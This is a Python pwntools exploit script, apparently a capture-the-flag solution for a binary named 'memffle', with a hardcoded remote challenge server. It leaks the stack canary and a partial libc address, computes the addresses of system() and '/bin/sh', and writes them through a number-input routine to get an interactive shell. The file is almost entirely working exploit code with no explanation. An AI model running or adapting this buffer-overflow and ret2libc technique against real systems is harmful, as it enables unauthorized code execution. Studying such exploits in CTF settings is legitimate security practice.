from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./memffle"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 1 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x56555000+0xd9e')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))


def hack():
	f = os.popen('./memffle_1')
	frand,seed,canary,sys,sh = f.read().strip('\n').split(' ')
	print seed,canary,sys,sh
	seed = int(seed,16)
	canary = int(canary)
	sys = int(sys)
	sh = int(sh)
	payload = '\x01'*0x11
	#raw_input()
	sa('is? ',payload)
	ru('\x01'*0x11)
	stack_canary = u32('\x00' + rv(3))
	ru('you: ')
	system_addr = (0xf7 << 24) + (0xe << 20) + (int(rv(2),16) << 12) + 0xda0
	sh_addr = system_addr - 0x0003ada0 + 0x15ba0b
	sla('input? ',str(139))

	for i in range(139):
		if i == canary:
			sla('number: ',str(stack_canary))
		elif i == sys:
			sla('number: ',str(system_addr))
		elif i == sh:
			sla('number: ',str(sh_addr))
		else:
			sla('number: ',str(i+1))
	print frand,seed,canary,sys,sh
	lg('stack_canary',stack_canary)
	lg('system_addr',system_addr)
	lg('sh_addr',sh_addr)

	p.interactive()
hack()